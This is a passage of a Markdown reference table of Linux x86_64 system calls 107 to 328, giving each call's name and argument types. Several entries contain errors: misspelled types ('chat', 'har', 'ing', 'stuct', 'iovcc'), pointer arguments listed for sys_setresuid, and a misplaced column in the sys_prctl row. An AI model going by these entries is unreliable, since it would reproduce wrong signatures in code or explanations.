| 107  | sys_geteuid                |                                   |                                       |                                       |                                       |                                      |                     |
| 108  | sys_getegid                |                                   |                                       |                                       |                                       |                                      |                     |
| 109  | sys_setpgid                | pid_t pid                         | pid_t pgid                            |                                       |                                       |                                      |                     |
| 110  | sys_getppid                |                                   |                                       |                                       |                                       |                                      |                     |
| 111  | sys_getpgrp                |                                   |                                       |                                       |                                       |                                      |                     |
| 112  | sys_setsid                 |                                   |                                       |                                       |                                       |                                      |                     |
| 113  | sys_setreuid               | uid_t ruid                        | uid_t euid                            |                                       |                                       |                                      |                     |
| 114  | sys_setregid               | gid_t rgid                        | gid_t egid                            |                                       |                                       |                                      |                     |
| 115  | sys_getgroups              | int gidsetsize                    | gid_t *grouplist                      |                                       |                                       |                                      |                     |
| 116  | sys_setgroups              | int gidsetsize                    | gid_t *grouplist                      |                                       |                                       |                                      |                     |
| 117  | sys_setresuid              | uid_t *ruid                       | uid_t *euid                           | uid_t *suid                           |                                       |                                      |                     |
| 118  | sys_getresuid              | uid_t *ruid                       | uid_t *euid                           | uid_t *suid                           |                                       |                                      |                     |
| 119  | sys_setresgid              | gid_t rgid                        | gid_t egid                            | gid_t sgid                            |                                       |                                      |                     |
| 120  | sys_getresgid              | gid_t *rgid                       | gid_t *egid                           | gid_t *sgid                           |                                       |                                      |                     |
| 121  | sys_getpgid                | pid_t pid                         |                                       |                                       |                                       |                                      |                     |
| 122  | sys_setfsuid               | uid_t uid                         |                                       |                                       |                                       |                                      |                     |
| 123  | sys_setfsgid               | gid_t gid                         |                                       |                                       |                                       |                                      |                     |
| 124  | sys_getsid                 | pid_t pid                         |                                       |                                       |                                       |                                      |                     |
| 125  | sys_capget                 | cap_user_header_t header          | cap_user_data_t dataptr               |                                       |                                       |                                      |                     |
| 126  | sys_capset                 | cap_user_header_t header          | const cap_user_data_t data            |                                       |                                       |                                      |                     |
| 127  | sys_rt_sigpending          | sigset_t *set                     | size_t sigsetsize                     |                                       |                                       |                                      |                     |
| 128  | sys_rt_sigtimedwait        | const sigset_t *uthese            | siginfo_t *uinfo                      | const struct timespec *uts            | size_t sigsetsize                     |                                      |                     |
| 129  | sys_rt_sigqueueinfo        | pid_t pid                         | int sig                               | siginfo_t *uinfo                      |                                       |                                      |                     |
| 130  | sys_rt_sigsuspend          | sigset_t *unewset                 | size_t sigsetsize                     |                                       |                                       |                                      |                     |
| 131  | sys_sigaltstack            | const stack_t *uss                | stack_t *uoss                         |                                       |                                       |                                      |                     |
| 132  | sys_utime                  | char *filename                    | struct utimbuf *times                 |                                       |                                       |                                      |                     |
| 133  | sys_mknod                  | const char *filename              | umode_t mode                          | unsigned dev                          |                                       |                                      |                     |
| 134  | sys_uselib                 | NOT IMPLEMENTED                   |                                       |                                       |                                       |                                      |                     |
| 135  | sys_personality            | unsigned int personality          |                                       |                                       |                                       |                                      |                     |
| 136  | sys_ustat                  | unsigned dev                      | struct ustat *ubuf                    |                                       |                                       |                                      |                     |
| 137  | sys_statfs                 | const char *pathname              | struct statfs *buf                    |                                       |                                       |                                      |                     |
| 138  | sys_fstatfs                | unsigned int fd                   | struct statfs *buf                    |                                       |                                       |                                      |                     |
| 139  | sys_sysfs                  | int option                        | unsigned long arg1                    | unsigned long arg2                    |                                       |                                      |                     |
| 140  | sys_getpriority            | int which                         | int who                               |                                       |                                       |                                      |                     |
| 141  | sys_setpriority            | int which                         | int who                               | int niceval                           |                                       |                                      |                     |
| 142  | sys_sched_setparam         | pid_t pid                         | struct sched_param *param             |                                       |                                       |                                      |                     |
| 143  | sys_sched_getparam         | pid_t pid                         | struct sched_param *param             |                                       |                                       |                                      |                     |
| 144  | sys_sched_setscheduler     | pid_t pid                         | int policy                            | struct sched_param *param             |                                       |                                      |                     |
| 145  | sys_sched_getscheduler     | pid_t pid                         |                                       |                                       |                                       |                                      |                     |
| 146  | sys_sched_get_priority_max | int policy                        |                                       |                                       |                                       |                                      |                     |
| 147  | sys_sched_get_priority_min | int policy                        |                                       |                                       |                                       |                                      |                     |
| 148  | sys_sched_rr_get_interval  | pid_t pid                         | struct timespec *interval             |                                       |                                       |                                      |                     |
| 149  | sys_mlock                  | unsigned long start               | size_t len                            |                                       |                                       |                                      |                     |
| 150  | sys_munlock                | unsigned long start               | size_t len                            |                                       |                                       |                                      |                     |
| 151  | sys_mlockall               | int flags                         |                                       |                                       |                                       |                                      |                     |
| 152  | sys_munlockall             |                                   |                                       |                                       |                                       |                                      |                     |
| 153  | sys_vhangup                |                                   |                                       |                                       |                                       |                                      |                     |
| 154  | sys_modify_ldt             | int func                          | void *ptr                             | unsigned long bytecount               |                                       |                                      |                     |
| 155  | sys_pivot_root             | const char *new_root              | const char *put_old                   |                                       |                                       |                                      |                     |
| 156  | sys__sysctl                | struct __sysctl_args *args        |                                       |                                       |                                       |                                      |                     |
| 157  | sys_prctl                  | int option                        | unsigned long arg2                    | unsigned long arg3                    | unsigned long arg4                    |                                      | unsigned long arg5  |
| 158  | sys_arch_prctl             | struct task_struct *task          | int code                              | unsigned long *addr                   |                                       |                                      |                     |
| 159  | sys_adjtimex               | struct timex *txc_p               |                                       |                                       |                                       |                                      |                     |
| 160  | sys_setrlimit              | unsigned int resource             | struct rlimit *rlim                   |                                       |                                       |                                      |                     |
| 161  | sys_chroot                 | const char *filename              |                                       |                                       |                                       |                                      |                     |
| 162  | sys_sync                   |                                   |                                       |                                       |                                       |                                      |                     |
| 163  | sys_acct                   | const char *name                  |                                       |                                       |                                       |                                      |                     |
| 164  | sys_settimeofday           | struct timeval *tv                | struct timezone *tz                   |                                       |                                       |                                      |                     |
| 165  | sys_mount                  | char *dev_name                    | char *dir_name                        | char *type                            | unsigned long flags                   | void *data                           |                     |
| 166  | sys_umount2                | const char *target                | int flags                             |                                       |                                       |                                      |                     |
| 167  | sys_swapon                 | const char *specialfile           | int swap_flags                        |                                       |                                       |                                      |                     |
| 168  | sys_swapoff                | const char *specialfile           |                                       |                                       |                                       |                                      |                     |
| 169  | sys_reboot                 | int magic1                        | int magic2                            | unsigned int cmd                      | void *arg                             |                                      |                     |
| 170  | sys_sethostname            | char *name                        | int len                               |                                       |                                       |                                      |                     |
| 171  | sys_setdomainname          | char *name                        | int len                               |                                       |                                       |                                      |                     |
| 172  | sys_iopl                   | unsigned int level                | struct pt_regs *regs                  |                                       |                                       |                                      |                     |
| 173  | sys_ioperm                 | unsigned long from                | unsigned long num                     | int turn_on                           |                                       |                                      |                     |
| 174  | sys_create_module          | REMOVED IN Linux 2.6              |                                       |                                       |                                       |                                      |                     |
| 175  | sys_init_module            | void *umod                        | unsigned long len                     | const char *uargs                     |                                       |                                      |                     |
| 176  | sys_delete_module          | const chat *name_user             | unsigned int flags                    |                                       |                                       |                                      |                     |
| 177  | sys_get_kernel_syms        | REMOVED IN Linux 2.6              |                                       |                                       |                                       |                                      |                     |
| 178  | sys_query_module           | REMOVED IN Linux 2.6              |                                       |                                       |                                       |                                      |                     |
| 179  | sys_quotactl               | unsigned int cmd                  | const char *special                   | qid_t id                              | void *addr                            |                                      |                     |
| 180  | sys_nfsservctl             | NOT IMPLEMENTED                   |                                       |                                       |                                       |                                      |                     |
| 181  | sys_getpmsg                | NOT IMPLEMENTED                   |                                       |                                       |                                       |                                      |                     |
| 182  | sys_putpmsg                | NOT IMPLEMENTED                   |                                       |                                       |                                       |                                      |                     |
| 183  | sys_afs_syscall            | NOT IMPLEMENTED                   |                                       |                                       |                                       |                                      |                     |
| 184  | sys_tuxcall                | NOT IMPLEMENTED                   |                                       |                                       |                                       |                                      |                     |
| 185  | sys_security               | NOT IMPLEMENTED                   |                                       |                                       |                                       |                                      |                     |
| 186  | sys_gettid                 |                                   |                                       |                                       |                                       |                                      |                     |
| 187  | sys_readahead              | int fd                            | loff_t offset                         | size_t count                          |                                       |                                      |                     |
| 188  | sys_setxattr               | const char *pathname              | const char *name                      | const void *value                     | size_t size                           | int flags                            |                     |
| 189  | sys_lsetxattr              | const char *pathname              | const char *name                      | const void *value                     | size_t size                           | int flags                            |                     |
| 190  | sys_fsetxattr              | int fd                            | const char *name                      | const void *value                     | size_t size                           | int flags                            |                     |
| 191  | sys_getxattr               | const char *pathname              | const char *name                      | void *value                           | size_t size                           |                                      |                     |
| 192  | sys_lgetxattr              | const char *pathname              | const char *name                      | void *value                           | size_t size                           |                                      |                     |
| 193  | sys_fgetxattr              | int fd                            | const har *name                       | void *value                           | size_t size                           |                                      |                     |
| 194  | sys_listxattr              | const char *pathname              | char *list                            | size_t size                           |                                       |                                      |                     |
| 195  | sys_llistxattr             | const char *pathname              | char *list                            | size_t size                           |                                       |                                      |                     |
| 196  | sys_flistxattr             | int fd                            | char *list                            | size_t size                           |                                       |                                      |                     |
| 197  | sys_removexattr            | const char *pathname              | const char *name                      |                                       |                                       |                                      |                     |
| 198  | sys_lremovexattr           | const char *pathname              | const char *name                      |                                       |                                       |                                      |                     |
| 199  | sys_fremovexattr           | int fd                            | const char *name                      |                                       |                                       |                                      |                     |
| 200  | sys_tkill                  | pid_t pid                         | ing sig                               |                                       |                                       |                                      |                     |
| 201  | sys_time                   | time_t *tloc                      |                                       |                                       |                                       |                                      |                     |
| 202  | sys_futex                  | u32 *uaddr                        | int op                                | u32 val                               | struct timespec *utime                | u32 *uaddr2                          | u32 val3            |
| 203  | sys_sched_setaffinity      | pid_t pid                         | unsigned int len                      | unsigned long *user_mask_ptr          |                                       |                                      |                     |
| 204  | sys_sched_getaffinity      | pid_t pid                         | unsigned int len                      | unsigned long *user_mask_ptr          |                                       |                                      |                     |
| 205  | sys_set_thread_area        | NOT IMPLEMENTED. Use arch_prctl   |                                       |                                       |                                       |                                      |                     |
| 206  | sys_io_setup               | unsigned nr_events                | aio_context_t *ctxp                   |                                       |                                       |                                      |                     |
| 207  | sys_io_destroy             | aio_context_t ctx                 |                                       |                                       |                                       |                                      |                     |
| 208  | sys_io_getevents           | aio_context_t ctx_id              | long min_nr                           | long nr                               | struct io_event *events               |                                      |                     |
| 209  | sys_io_submit              | aio_context_t ctx_id              | long nr                               | struct iocb **iocbpp                  |                                       |                                      |                     |
| 210  | sys_io_cancel              | aio_context_t ctx_id              | struct iocb *iocb                     | struct io_event *result               |                                       |                                      |                     |
| 211  | sys_get_thread_area        | NOT IMPLEMENTED. Use arch_prctl   |                                       |                                       |                                       |                                      |                     |
| 212  | sys_lookup_dcookie         | u64 cookie64                      | long buf                              | long len                              |                                       |                                      |                     |
| 213  | sys_epoll_create           | int size                          |                                       |                                       |                                       |                                      |                     |
| 214  | sys_epoll_ctl_old          | NOT IMPLEMENTED                   |                                       |                                       |                                       |                                      |                     |
| 215  | sys_epoll_wait_old         | NOT IMPLEMENTED                   |                                       |                                       |                                       |                                      |                     |
| 216  | sys_remap_file_pages       | unsigned long start               | unsigned long size                    | unsigned long prot                    | unsigned long pgoff                   | unsigned long flags                  |                     |
| 217  | sys_getdents64             | unsigned int fd                   | struct linux_dirent64 *dirent         | unsigned int count                    |                                       |                                      |                     |
| 218  | sys_set_tid_address        | int *tidptr                       |                                       |                                       |                                       |                                      |                     |
| 219  | sys_restart_syscall        |                                   |                                       |                                       |                                       |                                      |                     |
| 220  | sys_semtimedop             | int semid                         | struct sembuf *tsops                  | unsigned nsops                        | const struct timespec *timeout        |                                      |                     |
| 221  | sys_fadvise64              | int fd                            | loff_t offset                         | size_t len                            | int advice                            |                                      |                     |
| 222  | sys_timer_create           | const clockid_t which_clock       | struct sigevent *timer_event_spec     | timer_t *created_timer_id             |                                       |                                      |                     |
| 223  | sys_timer_settime          | timer_t timer_id                  | int flags                             | const struct itimerspec *new_setting  | struct itimerspec *old_setting        |                                      |                     |
| 224  | sys_timer_gettime          | timer_t timer_id                  | struct itimerspec *setting            |                                       |                                       |                                      |                     |
| 225  | sys_timer_getoverrun       | timer_t timer_id                  |                                       |                                       |                                       |                                      |                     |
| 226  | sys_timer_delete           | timer_t timer_id                  |                                       |                                       |                                       |                                      |                     |
| 227  | sys_clock_settime          | const clockid_t which_clock       | const struct timespec *tp             |                                       |                                       |                                      |                     |
| 228  | sys_clock_gettime          | const clockid_t which_clock       | struct timespec *tp                   |                                       |                                       |                                      |                     |
| 229  | sys_clock_getres           | const clockid_t which_clock       | struct timespec *tp                   |                                       |                                       |                                      |                     |
| 230  | sys_clock_nanosleep        | const clockid_t which_clock       | int flags                             | const struct timespec *rqtp           | struct timespec *rmtp                 |                                      |                     |
| 231  | sys_exit_group             | int error_code                    |                                       |                                       |                                       |                                      |                     |
| 232  | sys_epoll_wait             | int epfd                          | struct epoll_event *events            | int maxevents                         | int timeout                           |                                      |                     |
| 233  | sys_epoll_ctl              | int epfd                          | int op                                | int fd                                | struct epoll_event *event             |                                      |                     |
| 234  | sys_tgkill                 | pid_t tgid                        | pid_t pid                             | int sig                               |                                       |                                      |                     |
| 235  | sys_utimes                 | char *filename                    | struct timeval *utimes                |                                       |                                       |                                      |                     |
| 236  | sys_vserver                | NOT IMPLEMENTED                   |                                       |                                       |                                       |                                      |                     |
| 237  | sys_mbind                  | unsigned long start               | unsigned long len                     | unsigned long mode                    | unsigned long *nmask                  | unsigned long maxnode                | unsigned flags      |
| 238  | sys_set_mempolicy          | int mode                          | unsigned long *nmask                  | unsigned long maxnode                 |                                       |                                      |                     |
| 239  | sys_get_mempolicy          | int *policy                       | unsigned long *nmask                  | unsigned long maxnode                 | unsigned long addr                    | unsigned long flags                  |                     |
| 240  | sys_mq_open                | const char *u_name                | int oflag                             | mode_t mode                           | struct mq_attr *u_attr                |                                      |                     |
| 241  | sys_mq_unlink              | const char *u_name                |                                       |                                       |                                       |                                      |                     |
| 242  | sys_mq_timedsend           | mqd_t mqdes                       | const char *u_msg_ptr                 | size_t msg_len                        | unsigned int msg_prio                 | const stuct timespec *u_abs_timeout  |                     |
| 243  | sys_mq_timedreceive        | mqd_t mqdes                       | char *u_msg_ptr                       | size_t msg_len                        | unsigned int *u_msg_prio              | const struct timespec *u_abs_timeout |                     |
| 244  | sys_mq_notify              | mqd_t mqdes                       | const struct sigevent *u_notification |                                       |                                       |                                      |                     |
| 245  | sys_mq_getsetattr          | mqd_t mqdes                       | const struct mq_attr *u_mqstat        | struct mq_attr *u_omqstat             |                                       |                                      |                     |
| 246  | sys_kexec_load             | unsigned long entry               | unsigned long nr_segments             | struct kexec_segment *segments        | unsigned long flags                   |                                      |                     |
| 247  | sys_waitid                 | int which                         | pid_t upid                            | struct siginfo *infop                 | int options                           | struct rusage *ru                    |                     |
| 248  | sys_add_key                | const char *_type                 | const char *_description              | const void *_payload                  | size_t plen                           |                                      |                     |
| 249  | sys_request_key            | const char *_type                 | const char *_description              | const char *_callout_info             | key_serial_t destringid               |                                      |                     |
| 250  | sys_keyctl                 | int option                        | unsigned long arg2                    | unsigned long arg3                    | unsigned long arg4                    | unsigned long arg5                   |                     |
| 251  | sys_ioprio_set             | int which                         | int who                               | int ioprio                            |                                       |                                      |                     |
| 252  | sys_ioprio_get             | int which                         | int who                               |                                       |                                       |                                      |                     |
| 253  | sys_inotify_init           |                                   |                                       |                                       |                                       |                                      |                     |
| 254  | sys_inotify_add_watch      | int fd                            | const char *pathname                  | u32 mask                              |                                       |                                      |                     |
| 255  | sys_inotify_rm_watch       | int fd                            | __s32 wd                              |                                       |                                       |                                      |                     |
| 256  | sys_migrate_pages          | pid_t pid                         | unsigned long maxnode                 | const unsigned long *old_nodes        | const unsigned long *new_nodes        |                                      |                     |
| 257  | sys_openat                 | int dfd                           | const char *filename                  | int flags                             | int mode                              |                                      |                     |
| 258  | sys_mkdirat                | int dfd                           | const char *pathname                  | int mode                              |                                       |                                      |                     |
| 259  | sys_mknodat                | int dfd                           | const char *filename                  | int mode                              | unsigned dev                          |                                      |                     |
| 260  | sys_fchownat               | int dfd                           | const char *filename                  | uid_t user                            | gid_t group                           | int flag                             |                     |
| 261  | sys_futimesat              | int dfd                           | const char *filename                  | struct timeval *utimes                |                                       |                                      |                     |
| 262  | sys_newfstatat             | int dfd                           | const char *filename                  | struct stat *statbuf                  | int flag                              |                                      |                     |
| 263  | sys_unlinkat               | int dfd                           | const char *pathname                  | int flag                              |                                       |                                      |                     |
| 264  | sys_renameat               | int oldfd                         | const char *oldname                   | int newfd                             | const char *newname                   |                                      |                     |
| 265  | sys_linkat                 | int oldfd                         | const char *oldname                   | int newfd                             | const char *newname                   | int flags                            |                     |
| 266  | sys_symlinkat              | const char *oldname               | int newfd                             | const char *newname                   |                                       |                                      |                     |
| 267  | sys_readlinkat             | int dfd                           | const char *pathname                  | char *buf                             | int bufsiz                            |                                      |                     |
| 268  | sys_fchmodat               | int dfd                           | const char *filename                  | mode_t mode                           |                                       |                                      |                     |
| 269  | sys_faccessat              | int dfd                           | const char *filename                  | int mode                              |                                       |                                      |                     |
| 270  | sys_pselect6               | int n                             | fd_set *inp                           | fd_set *outp                          | fd_set *exp                           | struct timespec *tsp                 | void *sig           |
| 271  | sys_ppoll                  | struct pollfd *ufds               | unsigned int nfds                     | struct timespec *tsp                  | const sigset_t *sigmask               | size_t sigsetsize                    |                     |
| 272  | sys_unshare                | unsigned long unshare_flags       |                                       |                                       |                                       |                                      |                     |
| 273  | sys_set_robust_list        | struct robust_list_head *head     | size_t len                            |                                       |                                       |                                      |                     |
| 274  | sys_get_robust_list        | int pid                           | struct robust_list_head **head_ptr    | size_t *len_ptr                       |                                       |                                      |                     |
| 275  | sys_splice                 | int fd_in                         | loff_t *off_in                        | int fd_out                            | loff_t *off_out                       | size_t len                           | unsigned int flags  |
| 276  | sys_tee                    | int fdin                          | int fdout                             | size_t len                            | unsigned int flags                    |                                      |                     |
| 277  | sys_sync_file_range        | long fd                           | loff_t offset                         | loff_t bytes                          | long flags                            |                                      |                     |
| 278  | sys_vmsplice               | int fd                            | const struct iovec *iov               | unsigned long nr_segs                 | unsigned int flags                    |                                      |                     |
| 279  | sys_move_pages             | pid_t pid                         | unsigned long nr_pages                | const void **pages                    | const int *nodes                      | int *status                          | int flags           |
| 280  | sys_utimensat              | int dfd                           | const char *filename                  | struct timespec *utimes               | int flags                             |                                      |                     |
| 281  | sys_epoll_pwait            | int epfd                          | struct epoll_event *events            | int maxevents                         | int timeout                           | const sigset_t *sigmask              | size_t sigsetsize   |
| 282  | sys_signalfd               | int ufd                           | sigset_t *user_mask                   | size_t sizemask                       |                                       |                                      |                     |
| 283  | sys_timerfd_create         | int clockid                       | int flags                             |                                       |                                       |                                      |                     |
| 284  | sys_eventfd                | unsigned int count                |                                       |                                       |                                       |                                      |                     |
| 285  | sys_fallocate              | long fd                           | long mode                             | loff_t offset                         | loff_t len                            |                                      |                     |
| 286  | sys_timerfd_settime        | int ufd                           | int flags                             | const struct itimerspec *utmr         | struct itimerspec *otmr               |                                      |                     |
| 287  | sys_timerfd_gettime        | int ufd                           | struct itimerspec *otmr               |                                       |                                       |                                      |                     |
| 288  | sys_accept4                | int fd                            | struct sockaddr *upeer_sockaddr       | int *upeer_addrlen                    | int flags                             |                                      |                     |
| 289  | sys_signalfd4              | int ufd                           | sigset_t *user_mask                   | size_t sizemask                       | int flags                             |                                      |                     |
| 290  | sys_eventfd2               | unsigned int count                | int flags                             |                                       |                                       |                                      |                     |
| 291  | sys_epoll_create1          | int flags                         |                                       |                                       |                                       |                                      |                     |
| 292  | sys_dup3                   | unsigned int oldfd                | unsigned int newfd                    | int flags                             |                                       |                                      |                     |
| 293  | sys_pipe2                  | int *filedes                      | int flags                             |                                       |                                       |                                      |                     |
| 294  | sys_inotify_init1          | int flags                         |                                       |                                       |                                       |                                      |                     |
| 295  | sys_preadv                 | unsigned long fd                  | const struct iovec *vec               | unsigned long vlen                    | unsigned long pos_l                   | unsigned long pos_h                  |                     |
| 296  | sys_pwritev                | unsigned long fd                  | const struct iovec *vec               | unsigned long vlen                    | unsigned long pos_l                   | unsigned long pos_h                  |                     |
| 297  | sys_rt_tgsigqueueinfo      | pid_t tgid                        | pid_t pid                             | int sig                               | siginfo_t *uinfo                      |                                      |                     |
| 298  | sys_perf_event_open        | struct perf_event_attr *attr_uptr | pid_t pid                             | int cpu                               | int group_fd                          | unsigned long flags                  |                     |
| 299  | sys_recvmmsg               | int fd                            | struct msghdr *mmsg                   | unsigned int vlen                     | unsigned int flags                    | struct timespec *timeout             |                     |
| 300  | sys_fanotify_init          | unsigned int flags                | unsigned int event_f_flags            |                                       |                                       |                                      |                     |
| 301  | sys_fanotify_mark          | long fanotify_fd                  | long flags                            | __u64 mask                            | long dfd                              | long pathname                        |                     |
| 302  | sys_prlimit64              | pid_t pid                         | unsigned int resource                 | const struct rlimit64 *new_rlim       | struct rlimit64 *old_rlim             |                                      |                     |
| 303  | sys_name_to_handle_at      | int dfd                           | const char *name                      | struct file_handle *handle            | int *mnt_id                           | int flag                             |                     |
| 304  | sys_open_by_handle_at      | int dfd                           | const char *name                      | struct file_handle *handle            | int *mnt_id                           | int flags                            |                     |
| 305  | sys_clock_adjtime          | clockid_t which_clock             | struct timex *tx                      |                                       |                                       |                                      |                     |
| 306  | sys_syncfs                 | int fd                            |                                       |                                       |                                       |                                      |                     |
| 307  | sys_sendmmsg               | int fd                            | struct mmsghdr *mmsg                  | unsigned int vlen                     | unsigned int flags                    |                                      |                     |
| 308  | sys_setns                  | int fd                            | int nstype                            |                                       |                                       |                                      |                     |
| 309  | sys_getcpu                 | unsigned *cpup                    | unsigned *nodep                       | struct getcpu_cache *unused           |                                       |                                      |                     |
| 310  | sys_process_vm_readv       | pid_t pid                         | const struct iovec *lvec              | unsigned long liovcnt                 | const struct iovec *rvec              | unsigned long riovcnt                | unsigned long flags |
| 311  | sys_process_vm_writev      | pid_t pid                         | const struct iovec *lvec              | unsigned long liovcnt                 | const struct iovcc *rvec              | unsigned long riovcnt                | unsigned long flags |
| 312  | sys_kcmp                   | pid_t pid1                        | pid_t pid2                            | int type                              | unsigned long idx1                    | unsigned long idx2                   |                     |
| 313  | sys_finit_module           | int fd                            | const char __user *uargs              | int flags                             |                                       |                                      |                     |
| 314  | sys_sched_setattr          | pid_t pid                         | struct sched_attr __user *attr        | unsigned int flags                    |                                       |                                      |                     |
| 315  | sys_sched_getattr          | pid_t pid                         | struct sched_attr __user *attr        | unsigned int size                     | unsigned int flags                    |                                      |                     |
| 316  | sys_renameat2              | int olddfd                        | const char __user *oldname            | int newdfd                            | const char __user *newname            | unsigned int flags                   |                     |
| 317  | sys_seccomp                | unsigned int op                   | unsigned int flags                    | const char __user *uargs              |                                       |                                      |                     |
| 318  | sys_getrandom              | char __user *buf                  | size_t count                          | unsigned int flags                    |                                       |                                      |                     |
| 319  | sys_memfd_create           | const char __user *uname_ptr      | unsigned int flags                    |                                       |                                       |                                      |                     |
| 320  | sys_kexec_file_load        | int kernel_fd                     | int initrd_fd                         | unsigned long cmdline_len             | const char __user *cmdline_ptr        | unsigned long flags                  |                     |
| 321  | sys_bpf                    | int cmd                           | union bpf_attr *attr                  | unsigned int size                     |                                       |                                      |                     |
| 322  | stub_execveat              | int dfd                           | const char __user *filename           | const char __user *const __user *argv | const char __user *const __user *envp | int flags                            |                     |
| 323  | userfaultfd                | int flags                         |                                       |                                       |                                       |                                      |                     |
| 324  | membarrier                 | int cmd                           | int flags                             |                                       |                                       |                                      |                     |
| 325  | mlock2                     | unsigned long start               | size_t len                            | int flags                             |                                       |                                      |                     |
| 326  | copy_file_range            | int fd_in                         | loff_t __user *off_in                 | int fd_out                            | loff_t __user * off_out               | size_t len                           | unsigned int flags  |
| 327  | preadv2                    | unsigned long fd                  | const struct iovec __user *vec        | unsigned long vlen                    | unsigned long pos_l                   | unsigned long pos_h                  | int flags           |
| 328  | pwritev2                   | unsigned long fd                  | const struct iovec __user *vec        | unsigned long vlen                    | unsigned long pos_l                   | unsigned long pos_h                  | int flags           |